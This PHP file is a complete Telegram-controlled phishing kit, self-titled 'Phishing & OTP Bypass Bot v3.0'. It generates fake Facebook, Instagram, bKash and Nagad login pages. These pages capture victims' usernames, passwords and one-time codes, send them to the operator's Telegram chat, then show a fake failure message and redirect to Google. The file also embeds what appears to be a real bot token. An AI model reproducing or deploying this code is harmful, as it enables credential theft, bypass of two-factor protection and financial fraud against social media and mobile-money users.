<?php
/*
 * R8rAIHAN Phishing & OTP Bypass Bot v3.0
 */

$botToken = "8206530659:AAG2iqaLZzKBE5FaU5bGsiis65YXwcLPYRo"; // আপনার বটের টোকেন দিন
$api = "https://api.telegram.org/bot$botToken";

function tg($method, $data) {
    global $api;
    $url = $api . "/" . $method;
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
    $res = curl_exec($ch);
    curl_close($ch);
    return $res;
}

$update = json_decode(file_get_contents("php://input"), true);
$message = $update['message'] ?? null;

if ($message) {
    $chatId = $message['chat']['id'];
    $text = trim($message['text'] ?? '');

    if ($text === "/start") {
        tg("sendMessage", [
            "chat_id" => $chatId,
            "text" => "🔱 *R8rAIHAN Phishing Panel v3.0*\n\nChoose a template to generate link:",
            "parse_mode" => "Markdown",
            "reply_markup" => json_encode([
                "keyboard" => [
                    [["text" => "🔵 Facebook Login"], ["text" => "🟠 Instagram Login"]],
                    [["text" => "💸 bKash Offer"], ["text" => "💰 Nagad Cashout"]]
                ],
                "resize_keyboard" => true
            ])
        ]);
        exit;
    }

    $pages = ["🔵 Facebook Login" => "fb", "🟠 Instagram Login" => "ig", "💸 bKash Offer" => "bk", "💰 Nagad Cashout" => "ng"];

    if (isset($pages[$text])) {
        $type = $pages[$text];
        $appUrl = "https://" . $_SERVER['HTTP_HOST']; 
        $link = "$appUrl/index.php?u=$chatId&t=$type";
        
        tg("sendMessage", [
            "chat_id" => $chatId,
            "text" => "✅ *Link Generated!*\n\n🔗 *Target Link:* `$link`",
            "parse_mode" => "Markdown"
        ]);
        exit;
    }
}

// Data Handling (Post from Phishing Page)
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['u'])) {
    $chatId = $_POST['u'];
    $user = $_POST['user'] ?? '';
    $pass = $_POST['pass'] ?? '';
    $otp = $_POST['otp'] ?? '';
    $type = $_POST['t'];
    $ip = $_SERVER['REMOTE_ADDR'];

    if ($otp) {
        $msg = "⚡ *OTP RECEIVED!* ⚡\n\n🔑 *OTP Code:* `$otp` \n🌐 *IP:* $ip";
    } else {
        $msg = "🔥 *NEW LOGIN HIT!* 🔥\n\n🆔 *Template:* $type\n📧 *User:* `$user` \n🔑 *Pass:* `$pass` \n🌐 *IP:* $ip";
    }

    tg("sendMessage", ["chat_id" => $chatId, "text" => $msg, "parse_mode" => "Markdown"]);
    echo "OK";
    exit;
}

// Phishing Page Frontend
$chatId = $_GET['u'] ?? '';
$type = $_GET['t'] ?? 'fb';
if (!$chatId) exit("Access Denied");

$config = [
    'fb' => ['title' => 'Facebook - Log In', 'color' => '#1877f2', 'label' => 'Email or Phone'],
    'ig' => ['title' => 'Instagram', 'color' => '#e1306c', 'label' => 'Username or Email'],
    'bk' => ['title' => 'bKash - Get Reward', 'color' => '#e2136e', 'label' => 'Account Number'],
    'ng' => ['title' => 'Nagad - Cash Out', 'color' => '#f7941d', 'label' => 'Mobile Number']
];
$c = $config[$type];
?>
<!DOCTYPE html>
<html>
<head>
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <title><?=$c['title']?></title>
    <style>
        body{background:#f0f2f5;font-family:sans-serif;display:flex;justify-content:center;padding-top:50px;}
        .box{background:#fff;padding:20px;border-radius:8px;box-shadow:0 2px 4px rgba(0,0,0,0.1);width:320px;text-align:center;}
        h2{color:<?=$c['color']?>;margin-bottom:20px;}
        input{width:90%;padding:12px;margin:10px 0;border:1px solid #ddd;border-radius:4px;}
        button{width:97%;padding:12px;background:<?=$c['color']?>;color:#fff;border:none;border-radius:4px;font-weight:bold;cursor:pointer;}
        #otp-box{display:none;}
    </style>
</head>
<body>
    <div class="box">
        <h2><?=$c['title']?></h2>
        <div id="login-box">
            <input type="text" id="user" placeholder="<?=$c['label']?>">
            <input type="password" id="pass" placeholder="Password">
            <button onclick="sendLogin()">Log In</button>
        </div>
        <div id="otp-box">
            <p style="color:red">Security Code Sent! Check your phone.</p>
            <input type="text" id="otp" placeholder="Enter 6-digit code">
            <button onclick="sendOtp()">Verify</button>
        </div>
    </div>

    <script>
    function sendLogin(){
        let u = document.getElementById('user').value;
        let p = document.getElementById('pass').value;
        if(!u || !p) return alert("Fill all fields");
        
        let fd = new FormData();
        fd.append('u', '<?=$chatId?>');
        fd.append('t', '<?=$type?>');
        fd.append('user', u);
        fd.append('pass', p);

        fetch('', {method:'POST', body:fd}).then(() => {
            document.getElementById('login-box').style.display = 'none';
            document.getElementById('otp-box').style.display = 'block';
        });
    }

    function sendOtp(){
        let otp = document.getElementById('otp').value;
        let fd = new FormData();
        fd.append('u', '<?=$chatId?>');
        fd.append('otp', otp);
        fetch('', {method:'POST', body:fd}).then(() => {
            alert("Verification Failed! Try again later.");
            window.location.href = "https://google.com";
        });
    }
    </script>
</body>
</html>
